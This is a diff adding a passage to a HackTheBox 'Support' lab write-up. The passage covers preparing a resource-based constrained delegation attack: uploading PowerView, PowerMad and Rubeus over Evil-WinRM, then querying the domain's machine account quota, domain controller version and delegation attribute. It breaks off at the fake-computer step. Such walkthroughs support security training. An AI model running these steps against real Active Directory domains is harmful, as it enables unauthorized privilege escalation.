@@ -326,9 +326,68 @@ To exploit this, we need to keep track of the following information:
 * Fake Computer SID
 * Fake Computer Password
 
+We will also need the following scripts and upload them to the target:
+
+* `PowerView.ps1`
+* `PowerMad.ps1`
+* `Rubeus.exe` (pre-compiled exes from SharpCollection)
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> dir
+
+
+    Directory: C:\Users\support\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          6/8/2024   7:28 AM         135586 powermad.ps1
+-a----          6/8/2024   7:29 AM         904191 powerview.ps1
+-a----          6/8/2024   7:30 AM         446976 Rubeus.exe
+-a----          6/8/2024   6:42 AM        2387456 winPEASx64.exe
+
+# Executed files
+*Evil-WinRM* PS C:\Users\support\Documents> . .\powermad.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> . .\powerview.ps1
+```
+
+### Verify Environment
+
 In Bloodhound, we saw that the name of the target computer is `DC.SUPPORT.HTB` and, by clicking the node and looking at "unrolled admins", we can see that the admin on the target machine is `ADMINISTRATOR@SUPPORT.HTB`.
 
 ![Bloodhound Admins](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Images/BloodHound%20DC%20Admins.png)
+
+Verify that users can add machines to the domain and could see that the quote is set to the default of 10, which is good.
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
+
+ms-ds-machineaccountquota
+-------------------------
+                       10
+```
+
+Verify that there’s a 2012+ DC in the environment:
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController | select name,osversion | fl
+
+
+Name      : dc.support.htb
+OSVersion : Windows Server 2022 Standard
+```
+
+Check that the `msds-allowedtoactonbehalfofotheridentity` is empty, which it is:
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity
+
+name msds-allowedtoactonbehalfofotheridentity
+---- ----------------------------------------
+DC
+```
+
+### Create FakeComputer
 
 
 
